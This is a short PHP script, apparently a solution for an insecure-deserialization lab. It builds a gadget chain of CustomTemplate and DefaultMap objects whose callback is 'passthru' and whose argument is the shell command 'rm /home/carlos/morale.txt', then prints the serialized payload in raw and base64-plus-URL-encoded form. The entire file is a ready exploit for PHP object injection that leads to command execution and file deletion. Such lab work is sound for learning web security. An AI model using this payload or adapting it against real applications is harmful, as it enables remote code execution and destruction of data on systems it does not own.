<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;

    public function __construct() {
        $this->desc = new DefaultMap('passthru');
        $this->default_desc_type = 'rm /home/carlos/morale.txt';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

$test = new CustomTemplate();
$ser = serialize($test);
echo($ser . "\n");
echo("===================================================\n");
echo("base64 endcoded then urlencoded: \n");
echo(urlencode(base64_encode($ser)) . "\n");

?>
